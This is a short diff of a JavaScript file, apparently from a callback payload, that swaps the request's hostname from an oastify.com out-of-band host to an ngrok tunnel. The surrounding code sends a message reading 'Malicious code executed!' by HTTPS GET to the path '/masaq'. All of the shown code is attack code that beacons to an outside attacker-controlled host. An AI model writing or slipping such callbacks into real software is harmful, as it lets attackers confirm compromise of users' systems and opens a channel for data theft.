@@ -10,7 +10,7 @@ const data = JSON.stringify({ message: 'Malicious code executed!' });
 
 // Configure the options for the HTTP request
 const options = {
-  hostname: 'xopkckkuz01o0mk6v01roc6o6fc601oq.oastify.com',
+  hostname: '6024-149-200-188-47.ngrok-free.app',
   port: 443,
   path: '/masaq',
   method: 'GET',
